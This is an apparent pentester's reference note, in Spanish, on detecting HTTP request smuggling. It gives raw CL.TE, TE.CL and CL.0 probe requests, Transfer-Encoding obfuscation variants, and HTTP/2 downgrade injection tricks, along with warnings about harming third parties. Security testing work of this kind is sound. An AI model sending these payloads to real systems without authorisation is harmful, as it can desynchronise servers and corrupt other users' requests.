---
tipo: meta
aliases:
  - sondeo de smuggling
  - probes de request smuggling
tags:
  - meta/referencia
  - dominio/web
---

# Request smuggling - matriz de sondeo

> [!info] Referencia pura, no un zettel
> Cómo detectar y confirmar la desincronización, sin romper el tráfico de otros. Qué se hace después está en [[Request smuggling - matriz de explotación]]; el criterio, en [[MOC - Request smuggling]].

> [!danger] Sondear puede afectar a usuarios reales
> Una petición de confirmación mal calibrada antepone bytes a la petición de la **siguiente** persona en esa conexión. Usar siempre las pruebas de **tiempo** para detectar —no dañan a nadie— y solo pasar a las de confirmación con el sobrante apuntado a algo inocuo. Nunca sondear producción sin acordar la ventana.

## 0. Preparación

- Cliente que no reajuste `Content-Length` ni `Transfer-Encoding` automáticamente. La extensión HTTP Request Smuggler de Burp, o `curl --http1.1` con el cuerpo a mano.
- Los saltos de línea son `\r\n` **literales**. Las herramientas gráficas los alteran; verificar en la vista cruda.
- Reutilización de conexión: las pruebas necesitan que la misma conexión al back se reuse. Confirmarlo antes.

## 1. Detección por tiempo — la prueba segura

No confirma el ataque, detecta la ambigüedad sin dañar nada. La idea: construir una petición que haga que un servidor **espere** bytes que no van a llegar, y medir el retardo.

**CL.TE** — el frente usa `Content-Length`, el back `Transfer-Encoding`:

```
POST / HTTP/1.1
Host: objetivo.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

El frente reenvía 4 bytes (`1\r\nA\r\n` recortado); el back sigue el chunked, lee el trozo `1`/`A`, y **espera el siguiente trozo** que nunca llega. Si la respuesta tarda, hay CL.TE.

**TE.CL** — al revés:

```
POST / HTTP/1.1
Host: objetivo.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

El frente sigue el chunked y termina en el `0`; el back cuenta 6 bytes y espera. Retardo → TE.CL.

> [!warning] El orden importa
> La prueba de CL.TE por tiempo puede desincronizar de verdad si sale mal. La de TE.CL es más segura porque el trozo `0` cierra limpio para el frente. Empezar por detección de tiempo, no por confirmación.

## 2. Confirmación por diferencia de respuesta

Solo después de la detección por tiempo, y con cuidado. Dos peticiones: la primera esconde el principio de una segunda; si la segunda petición (legítima, propia) recibe una respuesta anómala, se confirmó.

El patrón de confirmación seguro manda las dos peticiones **uno mismo**, en la misma conexión, para no tocar a terceros:

```
POST / HTTP/1.1
Host: objetivo.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404-inexistente HTTP/1.1
X: 
```

Si la **propia** segunda petición vuelve `404` cuando pedía `/`, el prefijo se antepuso: confirmado sin tocar a nadie.

## 3. Ofuscación de `Transfer-Encoding` — para TE.TE

Cuando los dos servidores entienden `Transfer-Encoding`, hay que ofuscarla para que uno la vea y el otro no. Una por línea, se prueban todas:

`Transfer-Encoding: chunked` con un espacio antes de los dos puntos
`Transfer-Encoding : chunked`
`Transfer-Encoding:\tchunked` (tabulación)
`Transfer-Encoding: chunked` con un espacio inicial en el valor
`Transfer-Encoding\r\n: chunked` (continuación de línea)
`Transfer-Encoding: xchunked`
`Transfer-Encoding: chunked\r\nTransfer-Encoding: x` (dos cabeceras)
`X: X\r\nTransfer-Encoding: chunked` con nombre pegado
`Transfer-Encoding: chunk` con relleno
`Transfer-Encoding\x0b: chunked` (tabulación vertical)

Cada servidor tolera un subconjunto distinto. La que uno acepta y el otro rechaza es la que desincroniza.

## 4. HTTP/2 — degradación

Necesita un cliente que hable HTTP/2 crudo. Ver [[Request smuggling - degradación de HTTP2]].

**H2.CL** — declarar `Content-Length` dentro del mensaje H2:

```
:method POST
:path /
:authority objetivo.com
content-length 0

GET /404 HTTP/1.1
Host: objetivo.com
```

**H2.TE** — declarar `Transfer-Encoding: chunked` en el mensaje H2.

**Inyección por degradación** — caracteres que HTTP/2 permite y que al bajar a HTTP/1.1 se vuelven estructura:

Nombre de cabecera con `\r\n` incrustado → parte la cabecera
Valor de cabecera con `\r\n` → inyecta cabeceras nuevas
Nombre con dos puntos → confunde el parseo del back
Pseudo-cabecera `:path` con espacio y una línea de petición entera

## 5. Encontrar CL.0

Para [[Request smuggling - desincronización del cliente]]. Se buscan endpoints que ignoran el cuerpo:

Endpoints que no esperan cuerpo: archivos estáticos, redirecciones (`301`/`302`), manejadores de error, `GET` con cuerpo, `OPTIONS`, `TRACE`.

```
POST /static/imagen.png HTTP/1.1
Host: objetivo.com
Content-Length: 34

GET /404-inexistente HTTP/1.1
X: 
```

Si la conexión reutilizada devuelve `404` en la petición siguiente, el endpoint ignoró el `Content-Length`: es CL.0.

## 6. Tabla de decisión — qué probar según la pila

| Situación | Rama |
|---|---|
| HTTP/1.1 cliente↔frente, frente y back distintos | CL.TE / TE.CL / TE.TE — § 1 a 3 |
| HTTP/2 cliente↔frente, detrás de CDN | Degradación — § 4 |
| Un solo servidor, endpoints que ignoran cuerpo | CL.0 — § 5 |
| Explotable solo desde el navegador de la víctima | Desync del cliente → [[Request smuggling - desincronización del cliente]] |

## 7. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| Ningún retardo en ninguna prueba de tiempo | La cadena no desincroniza por largo, o normaliza. Probar TE.TE y H2 |
| La herramienta "arregló" el `Content-Length` | Reajuste automático activo. Desactivarlo |
| La prueba funciona una vez y después no | La conexión no se reutiliza, o se envenenó a un tercero. Reabrir |
| `400 Bad Request` inmediato | El frente normaliza y rechazó la ambigüedad. Buena mitigación, mala noticia |
| Retardo pero sin confirmación por diferencia | Hay ambigüedad de tiempo pero el sobrante no se antepone. Revisar reutilización |
| H2 crudo rechazado por el cliente | El cliente corrige las cabeceras. Hace falta una herramienta que las deje malformadas |
| CL.0 no reproduce | El endpoint sí lee el cuerpo. Probar otro manejador que no espere cuerpo |

## Relacionadas

[[MOC - Request smuggling]] · [[Request smuggling - matriz de explotación]] · [[CWE-444 - Inconsistent Interpretation of HTTP Requests]]
